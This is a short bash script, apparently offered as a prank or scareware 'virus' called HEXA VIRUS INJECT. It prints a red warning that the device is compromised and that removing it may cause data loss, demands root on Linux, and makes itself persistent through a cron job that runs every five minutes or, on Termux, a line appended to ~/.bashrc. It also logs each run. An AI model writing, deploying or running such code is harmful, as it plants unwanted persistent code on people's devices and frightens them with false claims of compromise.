#!/bin/bash

# Function to display the banner in red
function display_banner() {
    echo -e "\033[31m"
    echo "==============================="
    echo "       HEXA VIRUS INJECT       "
    echo "==============================="
    echo "WARNING: If you see this message, your device is compromised."
    echo "Attempting to remove this virus may cause data loss."
    echo -e "\033[0m"
}

# Function to check if the script is running with the necessary permissions
function check_permissions() {
    if [[ "$platform" == "linux" && $EUID -ne 0 ]]; then
        echo "This script requires root privileges. Please run as root."
        exit 1
    fi
}

# Function to set up persistence for the script
function setup_persistence() {
    if [[ "$platform" == "linux" ]]; then
        if command -v crontab >/dev/null 2>&1; then
            # Cron persistence (runs every 5 minutes)
            cron_job="*/5 * * * * $script_path"
            if ! (crontab -l 2>/dev/null | grep -qF "$script_path"); then
                (crontab -l 2>/dev/null; echo "$cron_job") | crontab -
                echo "Persistence set up with cron job on Linux."
            else
                echo "Cron job already exists."
            fi
        else
            echo "Cron is not available; persistence disabled."
        fi
    elif [[ "$platform" == "termux" ]]; then
        # Termux persistence using .bashrc
        if ! grep -qF "$script_path" ~/.bashrc; then
            echo "$script_path" >> ~/.bashrc
            echo "Persistence set up in .bashrc for Termux."
        else
            echo "Script already added to .bashrc."
        fi
    fi
}

# Function to log messages to a log file
function log_message() {
    local message="$1"
    echo "$(date '+%Y-%m-%d %H:%M:%S') - $message" >> "$log_file"
}

# Detect platform (Linux or Termux)
if [[ -d /data/data/com.termux ]]; then
    platform="termux"
else
    platform="linux"
fi

# Set the log file path
log_file="$HOME/hexa_virus_inject_log.txt"

# Display the banner
display_banner

# Check for necessary permissions
check_permissions

# Automatically detect the script's path
script_path="$(realpath "$0")"

# Set up persistence
setup_persistence
#Code By Faceless
log_message "Script executed successfully."

echo "Script execution completed."

# End of script
